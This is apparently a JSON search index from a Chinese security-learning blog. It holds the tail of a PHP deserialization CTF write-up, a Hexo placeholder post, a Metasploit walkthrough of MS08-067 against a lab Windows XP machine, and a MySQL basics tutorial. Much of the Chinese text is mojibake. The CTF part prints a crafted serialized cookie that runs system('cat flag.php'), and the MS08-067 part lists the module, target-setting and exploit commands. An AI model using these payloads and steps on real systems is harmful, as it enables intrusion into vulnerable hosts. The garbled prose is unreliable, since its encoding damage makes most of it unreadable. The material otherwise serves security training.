$user-&gt;login($username,$password);}$a=new User();echo(urlencode(serialize($a)));?&gt;    #output(cookie)user=O%3A4%3A%22User%22%3A3%3A%7Bs%3A14%3A%22%00User%00username%22%3Bs%3A4%3A%22name%22%3Bs%3A14%3A%22%00User%00password%22%3Bs%3A8%3A%22password%22%3Bs%3A11%3A%22%00User%00class%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D/?username=name&amp;password=password\nå³å¯å¾—åˆ°flag\n","categories":["CTF"],"tags":["CTF","WEB","PHP unserialize"]},{"title":"Hello World","url":"/2021/05/01/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\nMore info: Writing\nRun server$ hexo server\nMore info: Server\nGenerate static files$ hexo generate\nMore info: Generating\nDeploy to remote sites$ hexo deploy\nMore info: Deployment\n","categories":["Hello world"],"tags":["Hello world"]},{"title":"rpc-exploit - MS08-067","url":"/2023/03/23/rpc-exploit/","content":"\n\nMS08-067 (aka CVE-2008-4250) æ¼æ´å¤ç°å‰æœŸå‡†å¤‡å¤ç°ç¯å¢ƒ\næ”»å‡»æœºï¼škali-linux-2022.4-vmware-amd64\né¶æœºï¼šWindows  XP SP3\n\nå¤ç°å·¥å…·\nMSF\nå³Metasploit Framworkï¼Œæ˜¯ä¸€ä¸ªç»¼åˆæ€§çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œé›†æˆä¿¡æ¯æ”¶é›†ã€æ¼æ´æ‰«æã€æ¼æ´åˆ©ç”¨ä»¥åŠææƒç­‰åŠŸèƒ½çš„å·¥å…·ï¼Œç›®å‰å®‰è£…çš„kaliéƒ½è‡ªå¸¦MSF\n\nNmap\nå³Network Mapperï¼Œæ˜¯ä¸€æ¬¾å¼€æºå…è´¹çš„ç½‘ç»œå‘ç°ï¼ˆNetwork Discoveryï¼‰å’Œå®‰å…¨å®¡è®¡ï¼ˆSecurity Auditingï¼‰å·¥å…·ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒNmapç”¨äºåˆ—ä¸¾ç½‘ç»œä¸»æœºæ¸…å•ã€ç®¡ç†æœåŠ¡å‡çº§è°ƒåº¦ã€ç›‘æ§ä¸»æœºæˆ–æœåŠ¡è¿è¡ŒçŠ¶å†µã€‚Nmapå¯ä»¥æ£€æµ‹ç›®æ ‡æœºæ˜¯å¦åœ¨çº¿ã€ç«¯å£å¼€æ”¾æƒ…å†µã€ä¾¦æµ‹è¿è¡Œçš„æœåŠ¡ç±»å‹åŠç‰ˆæœ¬ä¿¡æ¯ã€ä¾¦æµ‹æ“ä½œç³»ç»Ÿä¸è®¾å¤‡ç±»å‹ç­‰ä¿¡æ¯ã€‚\n\n\næ¼æ´ä»‹ç»MS08-067æ¼æ´æ˜¯é€šè¿‡MSRPC over SMBé€šé“è°ƒç”¨ServeræœåŠ¡ç¨‹åºä¸­çš„NetPathCanonicalizeå‡½æ•°æ—¶è§¦å‘çš„ï¼Œè€ŒNetPathCanonicalizeå‡½æ•°åœ¨è¿œç¨‹è®¿é—®å…¶ä»–ä¸»æœºæ—¶ï¼Œä¼šè°ƒç”¨NetpwPathCanonicalizeå‡½æ•°ï¼Œå¯¹è¿œç¨‹è®¿é—®çš„è·¯å¾„è¿›è¡Œè§„èŒƒåŒ–,è€Œåœ¨NetpwPathCanonicalizeå‡½æ•°ä¸­å‘ç”Ÿäº†æ ˆç¼“å†²åŒºå†…å­˜é”™è¯¯ï¼Œé€ æˆå¯è¢«åˆ©ç”¨å®æ–½è¿œç¨‹ä»£ç æ‰§è¡Œã€‚\n\nWindowsçš„ServeræœåŠ¡åœ¨å¤„ç†ç‰¹åˆ¶RPCè¯·æ±‚æ—¶å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œè¿œç¨‹æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€æ¶æ„çš„RPCè¯·æ±‚è§¦å‘è¿™ä¸ªæº¢å‡ºï¼Œå¯¼è‡´å®Œå…¨å…¥ä¾µç”¨æˆ·ç³»ç»Ÿï¼ŒSYSTEMæƒé™æ‰§è¡Œä»»æ„æŒ‡ä»¤ã€‚å¯¹äºWindows 2000ã€XP å’ŒServer 2003ï¼Œæ— éœ€è®¤è¯ä¾¿å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ ï¼Œå¯¹äºWindows Vistaå’ŒServer 2008ï¼Œå¯èƒ½éœ€è¦è¿›è¡Œè®¤è¯ã€‚\n\nå½±å“èŒƒå›´Microsoft Windows 2000 Service Pack 4Windows XP Service Pack 2Windows XP Service Pack 3Windows XP Professional x64 EditionWindows XP Professional x64 Edition Service Pack 2Windows Server 2003 Service Pack 1Windows Server 2003 Service Pack 2Windows Server 2003 x64 EditionWindows Server 2003 x64 Edition Service Pack 2Windows Server 2003 SP1Windows Server 2003 SP2Windows Vista å’Œ Windows Vista Service Pack 1Windows Vista x64 Edition å’Œ Windows Vista x64 Edition Service Pack 1Windows Server 2008ï¼ˆç”¨äº 32 ä½ç³»ç»Ÿï¼‰Windows Server 2008ï¼ˆç”¨äºåŸºäº x64 çš„ç³»ç»Ÿï¼‰Windows Server 2008ï¼ˆç”¨äºåŸºäº Itanium çš„ç³»ç»Ÿï¼‰Windows 7 Betaï¼ˆç”¨äº 32 ä½ç³»ç»Ÿï¼‰Windows 7 Beta x64 EditionWindows 7 Betaï¼ˆç”¨äºåŸºäº Itanium çš„ç³»ç»Ÿï¼‰\næ¼æ´å¤ç°ç›®æ ‡è·å–C:\\GIFT\\ç›®å½•ä¸‹çš„flag\næ£€æµ‹é€šä¿¡é¦–å…ˆè·å–æ”»å‡»æœºä¸é¶æœºå„è‡ªçš„IPåœ°å€\n\næ”»å‡»æœºï¼ˆkaliï¼‰\nIP:192.168.80.128\n\n\né¶æœºï¼ˆWindows XPï¼‰IP:192.168.80.130\n\n\n\nå¹¶ä¸”è¦ä¿è¯äºŒè€…èƒ½äº’ç›¸é€šä¿¡\nkalièƒ½pingé€šxp\n\nxpèƒ½pingé€škali\n\nå¦‚æœå‘ç°å‡ºç°è¶…æ—¶ç­‰Errorï¼Œåˆ™å¯èƒ½æ˜¯xpçš„é˜²ç«å¢™æœªå…³é—­ï¼Œå…³é—­å³å¯\næ£€æŸ¥é¶æœºæ˜¯å¦å¼€å¯äº†445ç«¯å£ï¼Œåœ¨cmdä¸­æ‰§è¡Œnetstat -anå³å¯\n\nå¦‚å›¾æ‰€ç¤ºTCP 0.0.0.0:445çš„çŠ¶æ€ä¸ºLISTENINGï¼Œåˆ™è¯´æ˜ç«¯å£445å·²è¢«æ‰“å¼€\nä¸ºä»€ä¹ˆæ˜¯â€445â€ç«¯å£ï¼Ÿ\nç«¯å£çš„ä½œç”¨\næˆ‘ä»¬çŸ¥é“ï¼Œä¸€å°æ‹¥æœ‰IPåœ°å€çš„ä¸»æœºå¯ä»¥æä¾›è®¸å¤šæœåŠ¡ï¼Œæ¯”å¦‚WebæœåŠ¡ã€FTPæœåŠ¡ã€SMTPæœåŠ¡ç­‰ï¼Œè¿™äº›æœåŠ¡å®Œå…¨å¯ä»¥é€šè¿‡1ä¸ªIPåœ°å€æ¥å®ç°ã€‚é‚£ä¹ˆï¼Œä¸»æœºæ˜¯æ€ä¹ˆåŒºåˆ†ä¸åŒçš„ç½‘ç»œæœåŠ¡å‘¢ï¼Ÿæ˜¾ç„¶ä¸èƒ½åªé IPåœ°å€ï¼Œå› ä¸ºIPåœ°å€ä¸ç½‘ç»œæœåŠ¡çš„å…³ç³»æ˜¯ä¸€å¯¹å¤šçš„å…³ç³»ï¼Œå®é™…ä¸Šæ˜¯é€šè¿‡â€œIPåœ°å€+ç«¯å£å·â€æ¥åŒºåˆ†ä¸åŒçš„æœåŠ¡çš„ã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç«¯å£å¹¶ä¸æ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚æ¯”å¦‚ä½ çš„ç”µè„‘ä½œä¸ºå®¢æˆ·æœºè®¿é—®ä¸€å°WWWæœåŠ¡å™¨æ—¶ï¼ŒWWWæœåŠ¡å™¨ä½¿ç”¨â€œ80â€ç«¯å£ä¸ä½ çš„ç”µè„‘é€šä¿¡ï¼Œä½†ä½ çš„ç”µè„‘åˆ™å¯èƒ½ä½¿ç”¨â€œ3456â€è¿™æ ·çš„ç«¯å£ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n\n\nç«¯å£çš„åˆ†ç±»\nç«¯å£å…±1-65535å·ï¼ŒçŸ¥åç«¯å£èŒƒå›´ä»0åˆ°1023ï¼Œè¿™äº›ç«¯å£å·ä¸€èˆ¬å›ºå®šåˆ†é…ç»™ä¸€äº›æœåŠ¡ï¼Œå¤§å®¶å°½é‡ä¸è¦ä½¿ç”¨ã€‚æ¯”å¦‚21ç«¯å£åˆ†é…ç»™FTPæœåŠ¡ï¼Œ25ç«¯å·åˆ†é…ç»™SMTPé‚®ä»¶ä¼ è¾“åè®®æœåŠ¡ï¼Œ80ç«¯å£åˆ†é…ç»™HTTPæœåŠ¡ï¼Œ135ç«¯å£åˆ†é…ç»™RPCè¿œç¨‹è¿‡ç¨‹è°ƒç”¨æœåŠ¡ç­‰ç­‰ã€‚\nåŠ¨æ€ç«¯å£çš„èŒƒå›´ä»1024åˆ°65535ï¼Œè¿™äº›ç«¯å£å·ä¸€èˆ¬ä¸å›ºå®šåˆ†é…ç»™æŸä¸ªæœåŠ¡ï¼Œä¹Ÿå°±æ˜¯è¯´è®¸å¤šæœåŠ¡éƒ½å¯ä»¥ä½¿ç”¨è¿™äº›ç«¯å£ã€‚åªè¦è¿è¡Œçš„ç¨‹åºå‘ç³»ç»Ÿæå‡ºè®¿é—®ç½‘ç»œçš„ç”³è¯·ï¼Œé‚£ä¹ˆç³»ç»Ÿå°±å¯ä»¥ä»è¿™äº›ç«¯å£å·ä¸­åˆ†é…ä¸€ä¸ªä¾›è¯¥ç¨‹åºä½¿ç”¨ã€‚æ¯”å¦‚1024ç«¯å£å°±æ˜¯åˆ†é…ç»™ç¬¬ä¸€ä¸ªå‘ç³»ç»Ÿå‘å‡ºç”³è¯·çš„ç¨‹åºï¼Œåœ¨å…³é—­ç¨‹åºè¿›ç¨‹åï¼Œå°±ä¼šé‡Šæ”¾æ‰€å ç”¨çš„ç«¯å£å·ã€‚æ³¨æ„ï¼Œç«¯å£å†²çªå°±ä¸èƒ½æ­£å¸¸å·¥ä½œã€‚\nåŒæ—¶ï¼ŒåŠ¨æ€ç«¯å£å·ä¹Ÿå¸¸å¸¸è¢«ç—…æ¯’æœ¨é©¬ç¨‹åºæ‰€åˆ©ç”¨ï¼Œå¦‚å†°æ²³é»˜è®¤è¿æ¥ç«¯å£å·æ˜¯7626ã€WAY 2.4è¿æ¥ç«¯å£å·æ˜¯8011ã€Netspy 3.0è¿æ¥ç«¯å£å·æ˜¯7306ã€YAIç—…æ¯’è¿æ¥ç«¯å£å·æ˜¯1024ç­‰ç­‰ã€‚\n\nå¸¸è§çš„ç«¯å£\n\n\n\n\né»‘å®¢é€šè¿‡ç«¯å£å¯ä»¥å¹²ä»€ä¹ˆ\n\nä¿¡æ¯æ”¶é›†\nç›®æ ‡æ¢æµ‹\næœåŠ¡åˆ¤æ–­\nç³»ç»Ÿåˆ¤æ–­\nè§’è‰²åˆ†æ\n\n\n445ç«¯å£\nå‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/qq_36119192/article/details/83279527\næ¯”å¦‚2017å¹´å±å®³å…¨çƒçš„æ°¸æ’ä¹‹è“ï¼Œå°±æ˜¯åˆ©ç”¨çš„445ç«¯å£ã€‚\n445ç«¯å£å°±æ˜¯åˆ©ç”¨SMBï¼ˆServer Message Blockï¼‰Windowsåè®®æ—ï¼Œç”¨äºæ–‡ä»¶å…±äº«ã€æ‰“å°å…±äº«çš„æœåŠ¡ã€‚445ç«¯å£æ˜¯ä¸€ä¸ªæ¯èª‰å‚åŠçš„ç«¯å£ï¼Œæœ‰äº†å®ƒæˆ‘ä»¬å¯ä»¥åœ¨å±€åŸŸç½‘ä¸­è½»æ¾è®¿é—®å„ç§å…±äº«æ–‡ä»¶å¤¹æˆ–å…±äº«æ‰“å°æœºï¼Œä½†ä¹Ÿæ­£æ˜¯å› ä¸ºæœ‰äº†å®ƒï¼Œé»‘å®¢ä»¬æ‰æœ‰äº†å¯ä¹˜ä¹‹æœºï¼Œä»–ä»¬èƒ½é€šè¿‡è¯¥ç«¯å£å·å·å…±äº«ä½ çš„ç¡¬ç›˜ï¼Œç”šè‡³ä¼šåœ¨æ‚„æ— å£°æ¯ä¸­å°†ä½ çš„ç¡¬ç›˜æ ¼å¼åŒ–\nå…¬å¼€æœåŠ¡å™¨æ‰“å¼€139å’Œ445ç«¯å£æ˜¯ä¸€ä»¶éå¸¸å±é™©çš„äº‹æƒ…ã€‚ å¦‚æœæœ‰Guestå¸å·ï¼Œè€Œä¸”æ²¡æœ‰è®¾ç½®ä»»ä½•å¯†ç æ—¶ï¼Œå°±èƒ½å¤Ÿè¢«äººé€šè¿‡å› ç‰¹ç½‘è½»æ¾åœ°ç›—çœ‹æ–‡ä»¶ã€‚å¦‚æœç»™è¯¥å¸å·è®¾ç½®äº†å†™å…¥æƒé™ï¼Œç”šè‡³å¯ä»¥è½»æ¾åœ°ç¯¡æ”¹æ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨å¯¹å¤–éƒ¨å…¬å¼€çš„æœåŠ¡å™¨ä¸­ä¸åº”è¯¥æ‰“å¼€è¿™äº›ç«¯å£ã€‚é€šè¿‡å› ç‰¹ç½‘ä½¿ç”¨æ–‡ä»¶æœåŠ¡å™¨å°±ç­‰åŒè‡ªæ€è¡Œä¸ºï¼Œå› æ­¤ä¸€å®šè¦å…³é—­445ç«¯å£ã€‚å¯¹äºåˆ©ç”¨ADSLæ°¸ä¹…æ€§æ¥å…¥å› ç‰¹ç½‘çš„å®¢æˆ·ç«¯æœºå™¨å¯ä»¥è¯´ä¹Ÿæ˜¯å¦‚æ­¤ã€‚\n\n\næ¼æ´æ‰«æåˆ©ç”¨kaliçš„Nmapå·¥å…·å¯¹é¶æœºè¿›è¡Œä¿¡æ¯æœé›†ï¼Œå…ˆè¿›å…¥nmapå¾—æ¼æ´æ’ä»¶ç›®å½•ï¼Œæ£€æŸ¥ms08-067æ¨¡å—\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]â””â”€# cd /usr/share/nmap/scripts                                                                â”Œâ”€â”€(rootã‰¿kali)-[/usr/share/nmap/scripts]â””â”€# ls    \n\nç°åœ¨ä½¿ç”¨å‘½ä»¤nmap --script=vuln 192.168.80.130å¯¹é¶æœºè¿›è¡Œæ¼æ´æ‰«æï¼šä¸»æœºå­˜æ´»ï¼Œ445ç«¯å£å¼€æ”¾ï¼Œä¸”å­˜åœ¨MS08-067æ¼æ´ã€‚\n\næ‰§è¡Œmsfconsoleï¼Œè¿›å…¥MSF\n\nç”¨search ms08-067å‘½ä»¤æŸ¥çœ‹å¯åˆ©ç”¨æ¨¡å—\n\nä½¿ç”¨use exploit/windows/smb/ms08_067_netapiè¿›å…¥æ¨¡å—é‡Œï¼Œå¹¶ç”¨show optionsæŸ¥çœ‹ä½¿ç”¨è¯´æ˜\n\nå…¶ä¸­RHOSTSä»£è¡¨é¶æœºåœ°å€ï¼Œæ­¤æ—¶ä¸ºç©ºï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨è®¾ç½®ï¼Œè€ŒLHOSTä»£è¡¨æ”»å‡»æœºï¼ŒIPå·²è¢«è‡ªåŠ¨è®¾ç½®ï¼Œä½¿ç”¨set rhost 192.168.80.130è®¾ç½®é¶æœºåœ°å€\n\nä½¿ç”¨exploitè¿›è¡Œæ¸—é€æ”»å‡»ï¼Œå¹¶ä½¿ç”¨shellç›´æ¥è·³è½¬åˆ°é¶æœºå‘½ä»¤è¡Œ\n\næ‰¾åˆ°flag.txtåä½¿ç”¨typeæ‰“å¼€å³å¯\n\n\nflag:flag{n1ce_try_0f_MS08_067}\n","categories":["Vulnerability_recurrence"],"tags":["RPC","MS08-067"]},{"title":"åˆè§MySQLâ€”â€”åŸºç¡€ç¯‡","url":"/2023/03/09/MySQL_1/","content":"åˆè§MySQLâ€”â€”åŸºç¡€ç¯‡1.å®‰è£…MySQLï¼ˆzip archiveï¼‰windowsç¯å¢ƒä¸‹ä¸æ¨èç”¨å®‰è£…åŒ…å®‰è£…ï¼Œä¹‹åæ¸…ç†æ³¨å†Œè¡¨æ¯”è¾ƒéº»çƒ¦\nzip archive website:https://dev.mysql.com/downloads/mysql/\nè§£å‹ä¹‹ååœ¨æ–‡ä»¶å¤¹é‡Œæ–°å»ºä¸€ä¸ªmy.iniä½œä¸ºé…ç½®æ–‡ä»¶ï¼ˆæ–°ç‰ˆæœ¬ä¸è‡ªå¸¦è¿™ä¸ªï¼‰\n#my.ini[mysql]# è®¾ç½®mysqlå®¢æˆ·ç«¯é»˜è®¤å­—ç¬¦é›†default-character-set=utf8mb4[mysqld]#è®¾ç½®3306ç«¯å£port = 3306# è®¾ç½®mysqlçš„å®‰è£…ç›®å½•basedir=D:\\mysql\\mysql-8.0.32-winx64# è®¾ç½®mysqlæ•°æ®åº“çš„æ•°æ®çš„å­˜æ”¾ç›®å½•datadir=D:\\mysql\\data # å…è®¸æœ€å¤§è¿æ¥æ•°max_connections=200# æœåŠ¡ç«¯ä½¿ç”¨çš„å­—ç¬¦é›†é»˜è®¤ä¸ºUTF8character-set-server=utf8mb4# utf8bm4å³utf-8# åˆ›å»ºæ–°è¡¨æ—¶å°†ä½¿ç”¨çš„é»˜è®¤å­˜å‚¨å¼•æ“\nå…¶ä¸­basedirå’Œdatadiréœ€è¦æ ¹æ®è§£å‹ç›®å½•å’Œæ•°æ®å­˜æ”¾åœ°å€è¿›è¡Œä¿®æ”¹ï¼Œå»ºè®®åœ¨mysql-8.0.32-winx64åŒçº§æ–°å»ºä¸€ä¸ªdataæ–‡ä»¶å¤¹ç”¨äºå­˜æ”¾æ•°æ®\nä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œcmdå‘½ä»¤ï¼Œå¹¶åˆ‡æ¢åˆ°å®‰è£…ç›®å½•ä¸‹çš„binä¸‹\nåˆå§‹åŒ–MySQLï¼š\nmysqld --initialize --console#Expected output:#2023-03-06T04:35:17.961027Z 0 [System] [MY-013169] [Server] D:\\mysql\\mysql-8.0.32-winx64\\bin\\mysqld.exe (mysqld 8.0.32) #initializing of server in progress as process 23832#2023-03-06T04:35:17.979526Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.#2023-03-06T04:35:18.172968Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.#2023-03-06T04:35:18.707708Z 6 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: ************#Possible errors:#å¦‚æœæ‰§è¡ŒåæŠ¥é”™ï¼šæ— æ³•å¯åŠ¨æ­¤ç¨‹åºï¼Œå› ä¸ºè®¡ç®—æœºä¸­ä¸¢å¤±VCRUNTIME140_1.dllï¼Œå°è¯•é‡æ–°å®‰è£…æ­¤ç¨‹åºä»¥è§£å†³æ­¤é—®é¢˜#Tips:#*å·å¤„æ˜¯åˆå§‹å¯†ç ï¼Œéœ€è¦ä¿å­˜ä¸‹æ¥\nå®‰è£…MySQLï¼š\nmysqld --install#Expected output:#Service successfully installed.\nç™»å½•æ•°æ®åº“ï¼š\nmysql -u root -p#Expected output:#Enter password: ************#Welcome to the MySQL monitor.  Commands end with ; or \\g.#Your MySQL connection id is 9#Server version: 8.0.32#Possible errors:#ERROR 2003 (HY000): Can&#x27;t connect to MySQL server on &#x27;localhost:3306&#x27; (10061)#MySQLæœåŠ¡æœªå¼€å¯#win+r,è¾“å…¥&quot;services.msc&quot;#æ‰¾åˆ°&quot;MYSQL&quot;,å³é”®é€‰æ‹©&quot;å±æ€§&quot;,å°†&quot;å¯åŠ¨ç±»å‹&quot;æ”¹ä¸º&quot;è‡ªåŠ¨&quot;,ç‚¹å‡»&quot;æœåŠ¡çŠ¶æ€&quot;ä¸­çš„&quot;å¯åŠ¨&quot;å³å¯#ERROR 1045 (28000): Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27; (using password: NO)#å¯†ç è¾“é”™äº†ï¼Œè®°å¾—æ˜¯åˆå§‹å¯†ç \nä¿®æ”¹åˆå§‹å¯†ç ï¼š\nALTER USER root@localhost IDENTIFIED BY &#x27;********&#x27;;#Expected output:#Query OK, 0 rows affected (0.02 sec)\n2.MySQLåŸºç¡€æ“ä½œ2.1 æŸ¥çœ‹æ•°æ®åº“SQLæ˜¯ä¸€ç§è¯­è¨€\nSQLæ˜¯ä¸€ç§è¯­è¨€\nSQLæ˜¯ä¸€ç§è¯­è¨€\nä¸€å®šä¸èƒ½å¿˜è®°åŠ åˆ†å·ï¼Œåˆ†å·è¯´æ˜è¿™æ¡è¯­å¥ç»“æŸï¼Œæ¯ä¸ªå•è¯ä¹‹é—´è®°å¾—ç©ºæ ¼ï¼Œè¿™é‡Œå±•ç¤ºæ‰€æœ‰çš„æ•°æ®åº“ï¼Œbaseåé¢è®°å¾—åŠ sï¼Œctrl + cå¯ä»¥ç»ˆæ­¢å½“å‰è¾“å…¥ï¼Œmysqlä¸­ä¸åŒºåˆ†å¤§å°å†™ï¼Œå¦‚æœå‡ºç°ä»¥ä¸‹æƒ…å†µï¼Œè¯´æ˜è¯­å¥æœªç»“æŸï¼Œå¯èƒ½æ˜¯æ¼äº†åˆ†å·\nmysql&gt; show database    -&gt; \n#Expected output:mysql&gt; show databases;#+--------------------+#| Database           |#+--------------------+#| information_schema |#| mysql              |#| sys                |#+--------------------+#4 rows in set (0.01 sec)\n\n2.2 å»ºç«‹æ•°æ®åº“create database test1;\n#Expected output:#Query OK, 1 row affected (0.01 sec)mysql&gt; show databases;#+--------------------+#| Database           |#+--------------------+#| information_schema |#| mysql              |#| performance_schema |#| sys                |#| test1              |#+--------------------+#5 rows in set (0.00 sec)\n\n2.3 æ•°æ®åº“è¯­å¥åˆ†ç±»2.3.1 DQLï¼ˆæ•°æ®æŸ¥è¯¢è¯­è¨€ï¼‰æ•°æ®æŸ¥è¯¢è¯­è¨€ï¼ˆData Query Language, DQLï¼‰æ˜¯SQLè¯­è¨€ä¸­ï¼Œè´Ÿè´£è¿›è¡Œæ•°æ®æŸ¥è¯¢è€Œä¸ä¼šå¯¹æ•°æ®æœ¬èº«è¿›è¡Œä¿®æ”¹çš„è¯­å¥ï¼Œè¿™æ˜¯æœ€åŸºæœ¬çš„SQLè¯­å¥ã€‚\n#æˆ‘ä»¬åœ¨çœ‹åˆ°selectâ€¦è¿™æ ·çš„sqlè¯­å¥ï¼Œéƒ½æ˜¯æ•°æ®æŸ¥è¯¢è¯­å¥ï¼Œå‡¡æ˜¯å¸¦æœ‰selectå…³é”®å­—çš„SQLè¯­å¥éƒ½æ˜¯DQLè¯­å¥\n2.3.2 DMLï¼ˆæ•°æ®æ“çºµè¯­è¨€ï¼‰â€ƒâ€ƒæ•°æ®æ“çºµè¯­è¨€ï¼ˆData Manipulation Language, DMLï¼‰æ˜¯SQLè¯­è¨€ä¸­ï¼Œè´Ÿè´£å¯¹æ•°æ®åº“å¯¹è±¡è¿è¡Œæ•°æ®è®¿é—®å·¥ä½œçš„æŒ‡ä»¤é›†ï¼Œä»¥INSERTã€UPDATEã€DELETEä¸‰ç§æŒ‡ä»¤ä¸ºæ ¸å¿ƒï¼Œåˆ†åˆ«ä»£è¡¨æ’å…¥ã€æ›´æ–°ä¸åˆ é™¤ã€‚\n#å‡¡æ˜¯å¸¦æœ‰INSERTã€UPDATEã€DELETEå…³é”®å­—çš„è¯­å¥éƒ½æ˜¯DML#insert â€”â€” æ’å…¥ï¼Œç­‰åŒäºå¢#update â€”â€” æ›´æ–°ï¼Œç­‰åŒä¿®æ”¹#delete â€”â€” åˆ é™¤\nâ€‹    è¿™ä¸ªä¸»è¦æ“ä½œçš„æ˜¯è¡¨ä¸­çš„æ•°æ®\n2.3.3 DDLï¼ˆæ•°æ®å®šä¹‰è¯­è¨€ï¼‰â€ƒâ€ƒæ•°æ®å®šä¹‰è¯­è¨€ (Data Definition Language, DDL) æ˜¯SQLè¯­è¨€é›†ä¸­ï¼Œè´Ÿè´£æ•°æ®ç»“æ„å®šä¹‰ä¸æ•°æ®åº“å¯¹è±¡å®šä¹‰çš„è¯­è¨€ï¼Œç”±creatã€alter ä¸ drop ä¸‰ä¸ªè¯­æ³•æ‰€ç»„æˆ. DDL ä¸»è¦æ“ä½œçš„æ˜¯ è¡¨çš„ç»“æ„ ä¸æ˜¯è¡¨ä¸­çš„æ•°æ®\n#å‡¡æ˜¯å¸¦æœ‰ createï¼ˆå¢ï¼‰ã€alterï¼ˆæ”¹ï¼‰ã€dropï¼ˆåˆ ï¼‰å…³é”®å­—çš„è¯­å¥éƒ½æ˜¯DDL#create â€”â€” æ–°å»ºã€ç­‰åŒäºå¢#drop â€”â€” åˆ é™¤#alter â€”â€” ä¿®æ”¹\nâ€‹    è¿™ä¸ªå¢åˆ æ”¹ä¸ DML æœ‰æ‰€ä¸åŒï¼Œè¿™ä¸ªä¸»è¦æ˜¯å¯¹è¡¨ç»“æ„è¿›è¡Œæ“ä½œ.\n2.3.4 DCLï¼ˆæ•°æ®æ§åˆ¶è¯­è¨€ï¼‰â€ƒâ€ƒæ•°æ®æ§åˆ¶è¯­è¨€ (Data Control Language) åœ¨SQLè¯­è¨€ä¸­ï¼Œæ˜¯ä¸€ç§å¯å¯¹æ•°æ®è®¿é—®æƒè¿›è¡Œæ§åˆ¶çš„æŒ‡ä»¤ï¼Œå®ƒå¯ä»¥æ§åˆ¶ç‰¹å®šç”¨æˆ·è´¦æˆ·å¯¹æ•°æ®è¡¨ã€æŸ¥çœ‹è¡¨ã€é¢„å­˜ç¨‹åºã€ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ç­‰æ•°æ®åº“å¯¹è±¡çš„æ§åˆ¶æƒã€‚å¯¹æ•°æ®çš„æƒé™è¿›è¡Œæ§åˆ¶çš„è¯­è¨€.\n#è¯·æ±‚æˆæƒâ€”â€” grant#æ’¤é”€æˆæƒ â€”â€” revoke\n2.3.5 TCLï¼ˆäº‹åŠ¡å¤„ç†è¯­è¨€ï¼‰â€ƒâ€ƒè¿™é‡Œçš„TCLå¯ä¸æ˜¯ç‹ç‰Œç”µè§†ï¼Œäº‹åŠ¡å¤„ç†è¯­è¨€(Transaction Control Language),å®ƒçš„è¯­å¥èƒ½ç¡®ä¿è¢«DMLè¯­å¥å½±å“çš„è¡¨çš„æ‰€æœ‰è¡ŒåŠæ—¶å¾—ä»¥æ›´æ–°ã€‚æ˜¯ä¸€ç§äº‹åŠ¡æ§åˆ¶è¯­è¨€ã€‚\n#äº‹åŠ¡æäº¤ â€”â€” commit#äº‹åŠ¡å›æ»š â€”â€” rollback\n\n2.4 æ•°æ®åº“çš„åˆ†ç±»2.4.1 å…³ç³»å‹æ•°æ®åº“Mysqlã€Sql serverã€Oracle ã€SqLiteå±äºå…³ç³»å‹æ•°æ®åº“\næŠŠæ•°æ®æŒ‰ç…§ è¡¨ çš„å½¢å¼æ¥è¿›è¡Œç»„ç»‡ï¼ˆç±»ä¼¼äºExcelè¿™ç§å½¢å¼çš„ï¼‰ï¼Œå…³ç³»å‹æ•°æ®åº“èƒ½å¤Ÿå¯¹æ•°æ®è¿›è¡Œæ›´ä¸¥æ ¼çš„æ ¡éªŒï¼Œå¸¦æ¥æ›´å¥½çš„æ•°æ®çš„å®Œæ•´æ€§\n2.4.2 éå…³ç³»å‹æ•°æ®åº“Redisã€HBase ã€MongoDBå±äºéå…³ç³»å‹æ•°æ®åº“\næŠŠæ•°æ®æŒ‰ç…§ æ–‡æ¡£ çš„å½¢å¼æ¥è¿›è¡Œç»„ç»‡ï¼Œæ–‡æ¡£å’Œæ–‡æ¡£ä¹‹é—´çš„å·®åˆ«å¯ä»¥è¾ƒå¤§ï¼Œæ›´çµæ´»çš„ç»„ç»‡æ•°æ®ï¼Œæ•ˆç‡æ›´é«˜ï¼Œæ›´å®¹æ˜“åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹ä½¿ç”¨\n\n2.5 ä»€ä¹ˆæ˜¯è¡¨è¡¨æ˜¯ç»„ç»‡æ•°æ®çš„ä¸€ç§å½¢å¼ï¼Œç±»ä¼¼äºExcelä¸­çš„è¡¨æ ¼\næ•°æ®åº“ä¸­æ˜¯ä»¥ è¡¨æ ¼çš„å½¢å¼æ¥è¡¨ç¤ºæ•°æ®çš„ï¼Œå› ä¸ºè¡¨æ ¼æ¯”è¾ƒç›´è§‚ï¼Œä»»ä½•è¡¨éƒ½æœ‰è¡Œå’Œåˆ—\nè¡Œï¼ˆrowï¼‰: è¢«ç§°ä¸ºæ•°æ®/ è®°å½•\nåˆ—ï¼ˆcolumnï¼‰: è¢«ç§°ä¸ºå­—æ®µ\næ¯ä¸ªå­—æ®µéƒ½æœ‰å­—æ®µåã€æ•°æ®ç±»å‹ã€çº¦æŸæ¡ä»¶ç­‰å±æ€§\nå­—æ®µåï¼šåªæ˜¯ä¸€ä¸ªæ™®é€šçš„åå­—ï¼Œè§åçŸ¥æ„å°±è¡Œäº†\næ•°æ®ç±»å‹ï¼š 